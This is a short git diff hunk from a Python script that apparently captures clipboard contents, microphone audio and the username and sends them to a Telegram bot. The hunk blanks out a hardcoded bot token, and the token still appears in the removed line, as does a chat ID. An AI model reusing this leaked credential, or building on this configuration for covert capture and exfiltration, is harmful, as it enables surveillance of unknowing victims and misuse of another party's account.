@@ -33,7 +33,7 @@ clipboard_information_e = "e_clipboard.txt"
 microphone_time = 10
 time_iteration = 15
 number_of_iterations_end = 3
-bot_token = "7269502506:AAFx1FbzZpYOHrSFgdSLuw7YamKWSBpY7Ek"  # Replace with your bot token
+bot_token = ""  # Replace with your bot token
 chat_id = "6092309166"  # Replace with your chat ID
 
 username = getpass.getuser()
